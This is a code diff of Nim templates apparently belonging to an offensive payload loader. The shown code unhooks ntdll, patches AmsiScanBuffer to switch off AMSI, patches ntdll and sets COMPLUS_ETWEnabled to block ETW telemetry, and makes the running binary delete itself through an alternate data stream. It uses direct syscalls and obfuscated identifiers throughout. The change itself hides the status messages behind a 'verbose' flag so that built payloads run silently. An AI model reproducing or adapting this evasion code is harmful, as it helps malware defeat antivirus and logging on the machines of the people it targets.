@@ -38,14 +38,16 @@ proc ntdllunhook(): bool =
   else:
       ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
   if ntdllMapping == 0:
-    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
+    when defined(verbose):
+        echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
     return false
   when defined(DInvoke):
       ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
   else:
       ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
   if ntdllMappingAddress.isNil:
-    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
+    when defined(verbose):
+        echo obf("Could not map view of file ") & fmt"({GetLastError()})."
     return false
   hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
   hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
@@ -61,49 +63,58 @@ proc ntdllunhook(): bool =
           when defined(SysWhispers):
               status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
               if status != 0:
-                echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
                 return false
               status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
               if status != 0:
-                echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
                 return false
               status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
               if status != 0:
-                echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{status}."
                 return false
           else:
               when defined(Hellsgate):
                   if getSyscall(ntProtectTable):              
                       syscall = ntProtectTable.wSysCall
                   else:
-                      echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                      when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                       return false
                   # We need to use RWX here, as with RW the Syscall it'self (retrieved via HellsGate from memory ntdll) cannot execute anymore and the process crashes.
                   status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x40, addr oldProtection)    
               when defined(GetSyscallStub):
                   status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x04, addr oldProtection)
               if status != 0:
-                echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{status}."
                 return false
               when defined(Hellsgate):
                   if getSyscall(ntWriteTable):
                       syscall = ntWriteTable.wSysCall
                   else:
-                      echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                      when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                       return false
               status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
               if status != 0:
-                echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{status}."
                 return false
               when defined(Hellsgate):
                   if getSyscall(ntProtectTable):
                       syscall = ntProtectTable.wSysCall
                   else:
-                      echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                      when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                       return false
               status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
               if status != 0:
-                echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{status}."
+                when defined(verbose):
+                    echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{status}."
                 return false  
   status = NtClose(processH)
   status = NtClose(ntdllFile)
@@ -119,7 +130,8 @@ when isMainModule:
   when defined(GetSyscallStub):
       GetUnhookStubs()
   var result = ntdllunhook()
-  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
+  when defined(verbose):
+    echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
 
 """
 
@@ -142,7 +154,8 @@ proc PatchAmsi(): bool =
     else:
         amsi = LoadLibraryA(obf("amsi.dll"))
     if (amsi == 0):
-        echo obf("[X] Failed to load amsi.dll")
+        when defined(verbose):
+            echo obf("[X] Failed to load amsi.dll")
         return disabled
 
     when defined(DInvoke):
@@ -150,7 +163,8 @@ proc PatchAmsi(): bool =
     else:
         cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
     if isNil(cs):
-        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
+        when defined(verbose):
+            echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
 
@@ -188,9 +202,11 @@ proc PatchAmsi(): bool =
         status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to change memory protections.")
+            when defined(verbose):
+                echo obf("[-] Failed to change memory protections.")
         else:
-            echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")
 
         var 
             bytesWritten: SIZE_T
@@ -199,54 +215,66 @@ proc PatchAmsi(): bool =
         status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] oqiazasusjk Succeed!")
+            when defined(verbose):
+                echo obf("[+] oqiazasusjk Succeed!")
                 
                
         status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
     else:
         when defined(HellsGate):
             if getSyscall(ntProtectTable):                
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
         success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
         if (success != 0):
-            echo obf("NtProtectVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
             return disabled
-        echo obf("[*] Applying Syscall AMSI patch")
+        when defined(verbose):
+            echo obf("[*] Applying Syscall AMSI patch")
 
         when defined(HellsGate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var outLength: SIZE_T
     
         success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
     
         if (success != 0):
-            echo obf("NtWriteVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtWriteVirtualMemory failed")
             return disabled
         
         when defined(HellsGate):
             if getSyscall(ntProtectTable):
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
         success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
         if (success != 0):
-            echo obf("NtProtectVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
             return disabled
         else:
-            echo obf("[*] OldProtect set back")
+            when defined(verbose):
+                echo obf("[*] OldProtect set back")
             disabled = true
         
         when defined(GetSyscallStub):
@@ -256,13 +284,15 @@ proc PatchAmsi(): bool =
                 success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
             # Fails for some reason
             #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
-            echo obf("[*] Restored Stub protections: ") & $success
+            when defined(verbose):
+                echo obf("[*] Restored Stub protections: ") & $success
 
     return disabled
 
 when isMainModule:
     success = PatchAmsi()
-    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
+    when defined(verbose):
+        echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
 """
 
 
@@ -284,18 +314,21 @@ proc Patchntdll(): bool =
     else:
         ntdll = LoadLibraryA(obf("ntdll"))
     if (ntdll == 0):
-        echo obf("[X] Failed to load ntdll.dll")
+        when defined(verbose):
+            echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
     for singleAPI in PatchAPIs:
-        echo obf("[*] Patching : "),singleAPI
+        when defined(verbose):
+            echo obf("[*] Patching : "),singleAPI
 
         when defined(DInvoke):
             cs = MyGetProcAddress(ntdll,singleAPI)
         else:
             cs = GetProcAddress(ntdll,singleAPI)
         if isNil(cs):
-            echo obf("[X] Failed to get the address of "), singleAPI
+            when defined(verbose):
+                echo obf("[X] Failed to get the address of "), singleAPI
             break
 
     var oldProtection: DWORD = 0
@@ -332,9 +365,11 @@ proc Patchntdll(): bool =
         status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to change memory protections.")
+            when defined(verbose):
+                echo obf("[-] Failed to change memory protections.")
         else:
-            echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
 
         var 
             bytesWritten: SIZE_T
@@ -343,54 +378,66 @@ proc Patchntdll(): bool =
         status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] oqiazasusjk Succeed!")
+            when defined(verbose):
+                echo obf("[+] oqiazasusjk Succeed!")
                 
                
         status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
     else:
         when defined(HellsGate):
             if getSyscall(ntProtectTable):                
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
         success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
         if (success != 0):
-            echo obf("NtProtectVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
             return disabled
-        echo obf("[*] Applying Syscall ETW patch")
+        when defined(verbose):
+            echo obf("[*] Applying Syscall ETW patch")
 
         when defined(HellsGate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var outLength: SIZE_T
     
         success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
     
         if (success != 0):
-            echo obf("NtWriteVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtWriteVirtualMemory failed")
             return disabled
         
         when defined(HellsGate):
             if getSyscall(ntProtectTable):
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
         success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
         if (success != 0):
-            echo obf("NtProtectVirtualMemory failed")
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
             return disabled
         else:
-            echo obf("[*] OldProtect set back")
+            when defined(verbose):
+                echo obf("[*] OldProtect set back")
             disabled = true
         
         when defined(GetSyscallStub):
@@ -400,13 +447,15 @@ proc Patchntdll(): bool =
                 success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
             # Fails for some reason
             #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
-            echo obf("[*] Restored Stub protections: ") & $success
+            when defined(verbose):
+                echo obf("[*] Restored Stub protections: ") & $success
 
     return disabled
 
 when isMainModule:
     success = Patchntdll()
-    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
+    when defined(verbose):
+        echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
 """
 
 let SleepStubFirst * = fmt"""
@@ -545,11 +594,13 @@ var MyPathFileExistsW*: PathFileExistsW_t
 # temporary workaround, as the ordinal changes between OS Versions and the relative address via DInvoke is wrong.
 var shlwapi = MyLoadLibraryA(obf("shlwapi.dll"))
 if (shlwapi == 0):
-    echo obf("[X] Failed to load shlwapi.dll")
+    when defined(verbose):
+        echo obf("[X] Failed to load shlwapi.dll")
 
 var pathfileExistsAddress = MyGetProcAddress(shlwapi,obf("PathFileExistsW"))
 if isNil(pathfileExistsAddress):
-    echo obf("[X] Failed to get the address of 'PathFileExistsW'")
+    when defined(verbose):
+        echo obf("[X] Failed to get the address of 'PathFileExistsW'")
 
 
 MyCreateFileW = cast[CreateFileW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileW_HASH, 0, FALSE)))
@@ -628,24 +679,30 @@ when isMainModule:
 
     when defined(DInvoke):
         if MyGetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
-            echo obf("[-] Failed to get the current module handle")
+            when defined(verbose):
+                echo obf("[-] Failed to get the current module handle")
             quit(QuitFailure)
     else:
         if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
-            echo obf("[-] Failed to get the current module handle")
+            when defined(verbose):
+                echo obf("[-] Failed to get the current module handle")
             quit(QuitFailure)
 
     hCurrent = ds_open_handle(addr wcPath[0])
     if hCurrent == INVALID_HANDLE_VALUE:
-        echo obf("[-] Failed to acquire handle to current running process")
+        when defined(verbose):
+            echo obf("[-] Failed to acquire handle to current running process")
         quit(QuitFailure)
 
-    echo obf("[*] Attempting to rename file name")
+    when defined(verbose):
+        echo obf("[*] Attempting to rename file name")
     if not ds_rename_handle(hCurrent).bool:
-        echo obf("[-] Failed to rename to stream")
+        when defined(verbose):
+            echo obf("[-] Failed to rename to stream")
         quit(QuitFailure)
 
-    echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
+    when defined(verbose):
+        echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
     when defined(DInvoke):
         discard MyCloseHandle(hCurrent)
     else:
@@ -653,14 +710,17 @@ when isMainModule:
 
     hCurrent = ds_open_handle(addr wcPath[0])
     if hCurrent == INVALID_HANDLE_VALUE:
-        echo obf("[-] Failed to reopen current module")
+        when defined(verbose):
+            echo obf("[-] Failed to reopen current module")
         quit(QuitFailure)
 
     if not ds_deposite_handle(hCurrent).bool:
-        echo obf("[-] Failed to set delete deposition")
+        when defined(verbose):
+            echo obf("[-] Failed to set delete deposition")
         quit(QuitFailure)
 
-    echo obf("[*] Closing handle to trigger deletion deposition")
+    when defined(verbose):
+        echo obf("[*] Closing handle to trigger deletion deposition")
     when defined(DInvoke):
         discard MyCloseHandle(hCurrent)
     else:
@@ -668,10 +728,12 @@ when isMainModule:
 
     when defined(DInvoke):
         if not MyPathFileExistsW(addr wcPath[0]).bool:
-            echo obf("[*] File deleted successfully")
+            when defined(verbose):
+                echo obf("[*] File deleted successfully")
     else:
         if not PathFileExistsW(addr wcPath[0]).bool:
-            echo obf("[*] File deleted successfully")
+            when defined(verbose):
+                echo obf("[*] File deleted successfully")
 
 """
 
@@ -687,5 +749,6 @@ proc BlockETW(): bool =
 
 when isMainModule:
     var success = BlockETW()
-    echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
+    when defined(verbose):
+        echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
 """
